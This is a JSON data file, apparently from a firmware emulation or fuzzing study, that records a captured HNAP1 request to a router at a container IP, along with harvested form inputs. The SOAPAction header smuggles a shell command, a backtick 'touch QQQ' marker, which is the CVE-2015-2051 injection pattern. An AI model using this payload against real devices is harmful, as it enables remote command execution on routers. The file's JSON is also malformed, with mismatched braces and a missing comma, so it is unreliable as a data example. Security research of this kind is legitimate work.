qemu-user-targets/CVE-2015-2051/rd.json

{
  "requestsFound": {
    "POST http://172.17.0.15/HNAP1/ <?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetDeviceSettings xmlns=\"http://purenetworks.com/HNAP1/\" /></soap:Body></soap:Envelope>": {
      "_id": 26,
      "_urlstr": "http://172.17.0.15/HNAP1/",
      "_url": "http://172.17.0.15/HNAP1/",
      "_resourceType": "xhr",
      "_method": "POST",
      "_postData": "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetDeviceSettings xmlns=\"http://purenetworks.com/HNAP1/\" /></soap:Body></soap:Envelope>",
      "_headers": {
        "accept": "*/*",
        "referer": "http://172.17.0.15/info/Login.html",
        "x-requested-with": "XMLHttpRequest",
        "hnap_auth": "6D6D750E8ADAA1BF8DB575A807EC3A5E 1619637074",
        "soapaction": "\"http://purenetworks.com/HNAP1/GetDeviceSettings/`touch QQQ`\"",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.4427.0 Safari/537.36",
        "content-type": "text/xml; charset=UTF-8"
      }
  }
}
  "inputSet": [
    "v=20150211171738",
    "1619637078063=",
    "<?xml version=\"1.0\" encoding",
    "1619637078209=",
      "1619637776116=",
    "=Submit",
    "status_gz_smartconnect=on",
    "wifiName_smartconnect=",
    "password_smartconnect=",
    "status_gz_24=on",
    "wifiName_24g=",
    "password_24g=",
    "status_gz_5=on",
    "wifiName_5g=",
    "password_5g=",
    "status_gz_5hi=on",
    "wifiName_5g_hi=",
    "password_5g_hi=",
    "internetAccessOnly=on",
    "1619637838678=",
    "1619637901199=",
    "1619637939792=",
    "_=1619637968306",
    "_=1619637999815",
    "1619638002536="
  ]
}
